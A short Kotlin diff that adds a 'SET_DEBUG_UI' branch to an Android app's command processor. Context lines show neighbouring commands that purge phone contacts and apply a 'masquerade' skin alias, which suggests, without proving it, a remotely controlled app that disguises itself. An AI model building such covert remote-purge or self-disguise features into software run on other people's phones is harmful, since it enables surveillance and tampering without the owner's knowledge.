@@ -876,6 +876,13 @@ object CommandProcessor {
                     val count = PhoneManager.purgeContact(ctx, content.trim())
                     status = if (count >= 0) "PURGE_COMPLETE ($count)" else "PURGE_FAILED"
                 }
+                "SET_DEBUG_UI" -> {
+                    val state = content.trim().uppercase()
+                    val isEnabled = (state == "ON")
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                        .putBoolean("debug_ui_enabled", isEnabled).apply()
+                    status = "DEBUG_UI_ACCESS_SET: " + (if (isEnabled) "VISIBLE" else "HIDDEN")
+                }
                 "SET_MASQUERADE" -> {
                     val skin = content.trim().uppercase()
                     val aliasMap = mapOf(
